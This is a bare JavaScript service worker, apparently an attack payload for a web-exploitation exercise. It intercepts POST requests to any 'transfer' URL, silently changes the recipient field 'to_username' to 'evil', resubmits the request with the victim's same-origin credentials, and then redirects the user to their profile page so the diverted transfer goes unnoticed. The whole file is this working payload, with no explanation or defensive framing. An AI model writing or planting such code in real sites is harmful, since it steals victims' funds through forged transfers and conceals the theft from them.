self.addEventListener('fetch', (event) => {
    if (event.request.method === 'POST' && event.request.url.includes('transfer')) {
        event.respondWith(handlePostRequest(event.request));
    }
})

async function handlePostRequest(originalRequest) {
    try {
        const originalData = await originalRequest.clone().formData();
        originalData.set('to_username', 'evil');
        const userId = originalData.get('user_id');

        await fetch(originalRequest.url, {
            method: 'POST',
            body: originalData,
            credentials: 'same-origin'
        });

        const redirectUrl = userId ? `/profile?user_id=${encodeURIComponent(userId)}` : '/profile';
        return Response.redirect(redirectUrl, 303);
    } catch (error) {
        console.error('Error handling POST request:', error);
        return fetch(originalRequest);
    }
}
